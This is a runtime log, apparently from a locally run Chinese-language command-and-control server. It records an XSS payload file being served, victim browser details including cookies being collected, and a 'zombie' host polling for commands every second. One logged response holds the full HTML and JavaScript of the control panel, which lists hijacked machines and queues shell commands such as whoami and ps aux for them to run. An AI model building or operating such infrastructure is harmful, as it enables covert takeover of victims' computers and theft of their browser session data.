[parameters: ('127.0.0.1', '{"where":"http://127.0.0.1:8000/","target_ip":"127.0.0.1","cookie":"","user_agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36","time_stamp":"2025-06-24T15:22:14.166Z"}', None, '2025-06-24 23:22:14.168879', None)]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-24 23:22:14 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] add_message 執行完畢 (耗時: 0.0019s) -> 回傳: <Response 237 bytes [302 FOUND]>
2025-06-24 23:22:14 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:22:14] "[32mPOST /api/control/add_message HTTP/1.1[0m" 302 -
2025-06-24 23:22:14 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 xss_payload()
2025-06-24 23:22:14 | INFO     | control_route.py:125 | xss_payload() | 用戶請求XSS載荷文件
2025-06-24 23:22:14 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] xss_payload 執行完畢 (耗時: 0.0003s) -> 回傳: <Response 2102 bytes [200 OK]>
2025-06-24 23:22:14 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:22:14] "GET /api/control/xss_payload HTTP/1.1" 200 -
2025-06-24 23:22:14 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 add_message()
2025-06-24 23:22:14 | INFO     | control_route.py:18 | add_message() | 用戶請求添加消息 (POST)
2025-06-24 23:22:14 | ERROR    | control_route.py:58 | add_message() | 添加消息時發生錯誤: (sqlite3.IntegrityError) UNIQUE constraint failed: web_shell_back_point.target_ip
[SQL: INSERT INTO web_shell_back_point (target_ip, target_config, "where", created_at, to_do_command) VALUES (?, ?, ?, ?, ?)]
[parameters: ('127.0.0.1', '{"where":"http://127.0.0.1:8000/","target_ip":"127.0.0.1","cookie":"","user_agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36","time_stamp":"2025-06-24T15:22:14.310Z"}', None, '2025-06-24 23:22:14.312777', None)]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-24 23:22:14 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] add_message 執行完畢 (耗時: 0.0014s) -> 回傳: <Response 237 bytes [302 FOUND]>
2025-06-24 23:22:14 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:22:14] "[32mPOST /api/control/add_message HTTP/1.1[0m" 302 -
2025-06-24 23:22:15 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:22:15 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:22:15 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:22:15 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:22:15] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:22:16 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:22:16 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:22:16 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:22:16 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:22:16] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:22:17 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:22:17 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:22:17 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:22:17 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:22:17] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:22:18 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:22:18 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:22:18 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:22:18 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:22:18] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:22:18 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_messages()
2025-06-24 23:22:18 | INFO     | control_route.py:71 | get_messages() | 用戶請求獲取消息
2025-06-24 23:22:18 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_messages 執行完畢 (耗時: 0.0006s) -> 回傳: '<!DOCTYPE html>\n<html lang="zh-TW">\n    \n    <head>\n        <meta charset="UTF-8">\n        <meta name="viewport" content="width=device-width, initial-scale=1.0">\n        <title>控制消息</title>\n        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">\n        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">\n        \n    </head>\n    <body>\n        <!-- 导航栏 -->\n        <nav class="navbar navbar-expand-lg navbar-dark bg-primary">\n            <div class="container">\n                <a class="navbar-brand" href="/">\n                    <i class="fas fa-shield-alt"></i> 扫描目标管理系统\n                </a>\n                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">\n                    <span class="navbar-toggler-icon"></span>\n                </button>\n                <div class="collapse navbar-collapse" id="navbarNav">\n                    <ul class="navbar-nav ms-auto">\n                        <li class="nav-item">\n                            <a class="nav-link" href="/">\n                                <i class="fas fa-home"></i> 目标列表\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/add_target">\n                                <i class="fas fa-plus"></i> 添加目标\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/api/control/get_messages">\n                                <i class="fas fa-cog"></i> 控制消息\n                            </a>\n                        </li>\n                    </ul>\n                </div>\n            </div>\n        </nav>\n\n        \n        \n        \n\n        \n<div class="container">\n    <!-- Flash 消息區域 -->\n    \n    \n    \n\n    <!-- 選項卡導航 -->\n    <div class="tab-navigation">\n        <button class="tab-btn active" onclick="showTab(\'messages\')">📨 控制消息</button>\n        <button class="tab-btn" onclick="showTab(\'zombies\')">🧟 殭屍管理</button>\n    </div>\n\n    <!-- 控制消息選項卡 -->\n    <div id="messages-tab" class="tab-content active">\n        <h2>控制消息</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">透過此面板管理和監控您的C2控制消息</p>\n        <form method="post" action="/api/control/add_message">\n            <div class="form-group">\n                <label class="form-label" for="message">控制消息</label>\n                <input type="text" id="message" name="message" placeholder="輸入要發送的控制消息" required>\n            </div>\n            <div class="form-group">\n                <label class="form-label" for="target_ip">目標IP地址</label>\n                <input type="text" id="target_ip" name="target_ip" placeholder="輸入目標IP地址（可選）">\n            </div>\n            <button type="submit">發送消息</button>\n        </form>\n    </div>\n\n    <!-- 殭屍管理選項卡 -->\n    <div id="zombies-tab" class="tab-content">\n        <h2>殭屍機器管理</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">管理已連接的殭屍機器並發送命令</p>\n\n        <!-- 殭屍機器列表 -->\n        <div class="zombie-controls">\n            <button id="refresh-zombies" class="refresh-btn">🔄 刷新殭屍列表</button>\n            <div id="zombie-count" class="zombie-count">載入中...</div>\n        </div>\n\n        <div id="zombie-list" class="zombie-list">\n            <!-- 殭屍機器將通過JavaScript動態載入 -->\n        </div>\n\n        <!-- 命令發送表單 -->\n        <div class="command-form-container" style="display: none;" id="command-form-container">\n            <h3>發送命令給殭屍機器</h3>\n            <form id="command-form">\n                <div class="form-group">\n                    <label class="form-label" for="selected-zombie">選中的殭屍機器</label>\n                    <input type="text" id="selected-zombie" readonly>\n                </div>\n                <div class="form-group">\n                    <label class="form-label" for="command">執行命令</label>\n                    <input type="text" id="command" name="command" placeholder="輸入要執行的命令" required>\n                </div>\n                <div class="form-group">\n                    <label class="form-label">常用命令</label>\n                    <div class="quick-commands">\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'whoami\')">whoami</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'pwd\')">pwd</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ls -la\')">ls -la</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ps aux\')">ps aux</button>\n                        <button type="button" class="quick-cmd-btn"\n                            onclick="setCommand(\'netstat -tuln\')">netstat</button>\n                    </div>\n                </div>\n                <button type="submit">💀 發送命令</button>\n                <button type="button" onclick="hideCommandForm()">取消</button>\n            </form>\n        </div>\n    </div>\n    <div style="display: flex; justify-content: space-between; align-items: center; margin: 40px 0 20px 0;">\n        <h1 style="margin: 0;">已經知道的消息列表</h1>\n        <a href="/api/control/help" class="help-btn">📚 查看使用說明</a>\n    </div>\n    <div id="messageList">\n        \n        \n        <div class="message">\n            <p><strong>目標IP:</strong> 127.0.0.1</p>\n            <p><strong>目標配置:</strong> {&#34;where&#34;:&#34;http://127.0.0.1:8000/&#34;,&#34;target_ip&#34;:&#34;127.0.0.1&#34;,&#34;cookie&#34;:&#34;&#34;,&#34;user_agent&#34;:&#34;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36&#34;,&#34;time_stamp&#34;:&#34;2025-06-24T15:20:57.064Z&#34;}</p>\n            <p><strong>建立時間:</strong> 2025-06-24 23:20:57.066659</p>\n        </div>\n        \n        \n    </div>\n</div>\n<link rel="stylesheet" href="/static/css/control_message.css">\n\n<script>\n    // 選項卡切換功能\n    function showTab(tabName) {\n        // 隱藏所有選項卡內容\n        const tabContents = document.querySelectorAll(\'.tab-content\');\n        tabContents.forEach(tab => {\n            tab.classList.remove(\'active\');\n        });\n\n        // 移除所有選項卡按鈕的活動狀態\n        const tabBtns = document.querySelectorAll(\'.tab-btn\');\n        tabBtns.forEach(btn => {\n            btn.classList.remove(\'active\');\n        });\n\n        // 顯示選中的選項卡\n        document.getElementById(tabName + \'-tab\').classList.add(\'active\');\n        event.target.classList.add(\'active\');\n\n        // 如果切換到殭屍管理選項卡，自動載入殭屍列表\n        if (tabName === \'zombies\') {\n            loadZombies();\n        }\n    }\n\n    // 載入殭屍機器列表\n    async function loadZombies() {\n        try {\n            const response = await fetch(\'/api/control/get_zombies\');\n            const data = await response.json();\n\n            const zombieCountEl = document.getElementById(\'zombie-count\');\n            const zombieListEl = document.getElementById(\'zombie-list\');\n\n            if (data.status === \'success\') {\n                zombieCountEl.textContent = `找到 ${data.count} 台殭屍機器`;\n\n                if (data.zombies.length === 0) {\n                    zombieListEl.innerHTML = \'<div class="empty-state">目前沒有連接的殭屍機器</div>\';\n                } else {\n                    let zombieHtml = \'\';\n                    data.zombies.forEach(zombie => {\n                        zombieHtml += `\n                        <div class="zombie-card" onclick="selectZombie(\'${zombie}\')">\n                            <div class="zombie-info">\n                                <h4>🧟 ${zombie}</h4>\n                                <p>點擊選擇此殭屍機器</p>\n                            </div>\n                            <div class="zombie-actions">\n                                <button class="action-btn" onclick="event.stopPropagation(); selectZombie(\'${zombie}\')">\n                                    💀 發送命令\n                                </button>\n                            </div>\n                        </div>\n                    `;\n                    });\n                    zombieListEl.innerHTML = zombieHtml;\n                }\n            } else {\n                zombieCountEl.textContent = \'載入失敗\';\n                zombieListEl.innerHTML = `<div class="error-state">載入失敗: ${data.error}</div>`;\n            }\n        } catch (error) {\n            console.error(\'載入殭屍列表失敗:\', error);\n            document.getElementById(\'zombie-count\').textContent = \'載入失敗\';\n            document.getElementById(\'zombie-list\').innerHTML = \'<div class="error-state">網路錯誤</div>\';\n        }\n    }\n\n    // 選擇殭屍機器\n    function selectZombie(zombieIp) {\n        document.getElementById(\'selected-zombie\').value = zombieIp;\n        document.getElementById(\'command-form-container\').style.display = \'block\';\n        document.getElementById(\'command\').focus();\n    }\n\n    // 隱藏命令表單\n    function hideCommandForm() {\n        document.getElementById(\'command-form-container\').style.display = \'none\';\n        document.getElementById(\'command\').value = \'\';\n        document.getElementById(\'selected-zombie\').value = \'\';\n    }\n\n    // 設置快速命令\n    function setCommand(cmd) {\n        document.getElementById(\'command\').value = cmd;\n    }\n\n    // 發送命令給殭屍機器\n    document.getElementById(\'command-form\').addEventListener(\'submit\', async function (e) {\n        e.preventDefault();\n\n        const zombieIp = document.getElementById(\'selected-zombie\').value;\n        const command = document.getElementById(\'command\').value;\n\n        if (!zombieIp || !command) {\n            alert(\'請選擇殭屍機器並輸入命令\');\n            return;\n        }\n\n        try {\n            const formData = new FormData();\n            formData.append(\'command\', command);\n\n            const response = await fetch(`/api/control/add_command_to_do/${zombieIp}`, {\n                method: \'POST\',\n                body: formData\n            });\n\n            if (response.ok) {\n                alert(`命令已發送給 ${zombieIp}`);\n                hideCommandForm();\n            } else {\n                const errorData = await response.json();\n                alert(`發送失敗: ${errorData.error}`);\n            }\n        } catch (error) {\n            console.error(\'發送命令失敗:\', error);\n            alert(\'發送命令時發生網路錯誤\');\n        }\n    });\n\n    // 刷新殭屍列表\n    document.getElementById(\'refresh-zombies\').addEventListener(\'click\', loadZombies);\n\n    // 頁面載入時檢查當前選項卡\n    document.addEventListener(\'DOMContentLoaded\', function () {\n        // 檢查URL參數是否指定了選項卡\n        const urlParams = new URLSearchParams(window.location.search);\n        const tab = urlParams.get(\'tab\');\n        if (tab === \'zombies\') {\n            showTab(\'zombies\');\n        }\n    });\n</script>\n\n\n\n        <!-- JavaScript 引用 -->\n        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>\n        \n    </body>\n    \n</html>'
2025-06-24 23:22:18 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:22:18] "GET /api/control/get_messages HTTP/1.1" 200 -
2025-06-24 23:22:18 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:22:18] "[36mGET /static/css/control_message.css HTTP/1.1[0m" 304 -
2025-06-24 23:22:18 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:22:18] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-24 23:22:19 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:22:19 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:22:19 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:22:19 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:22:19] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:22:20 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:22:20 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:22:20 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:22:20 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:22:20] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:22:21 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:22:21 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:22:21 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:22:21 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:22:21] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:22:22 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:22:22 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:22:22 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:22:22 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:22:22] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:22:23 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:22:23 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:22:23 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0005s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:22:23 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:22:23] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:22:24 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:22:24 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:22:24 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:22:24 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:22:24] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:22:25 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:22:25 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:22:25 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:22:25 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:22:25] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:22:26 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:22:26 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:22:26 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:22:26 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:22:26] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:22:27 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:22:27 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:22:27 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:22:27 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:22:27] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:22:28 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:22:28 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:22:28 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:22:28 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:22:28] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:22:29 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:22:29 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:22:29 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:22:29 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:22:29] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:22:30 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:22:30 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:22:30 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:22:30 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:22:30] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:22:31 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:22:31 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:22:31 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:22:31 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:22:31] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:22:32 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:22:32 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:22:32 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:22:32 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:22:32] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:22:33 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:22:33 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:22:33 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:22:33 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:22:33] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:22:34 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:22:34 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:22:34 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:22:34 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:22:34] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:22:35 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:22:35 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:22:35 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:22:35 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:22:35] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:22:36 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:22:36 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:22:36 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:22:36 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:22:36] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:22:37 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:22:37 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:22:37 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0005s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:22:37 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:22:37] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:22:38 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:22:38 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:22:38 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:22:38 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:22:38] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:22:39 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:22:39 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:22:39 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0005s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:22:39 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:22:39] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:22:40 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:22:40 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:22:40 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:22:40 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:22:40] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:22:41 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:22:41 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:22:41 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:22:41 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:22:41] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:22:42 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:22:42 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:22:42 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:22:42 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:22:42] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:22:43 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:22:43 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:22:43 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:22:43 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:22:43] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:22:44 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:22:44 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:22:44 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:22:44 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:22:44] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
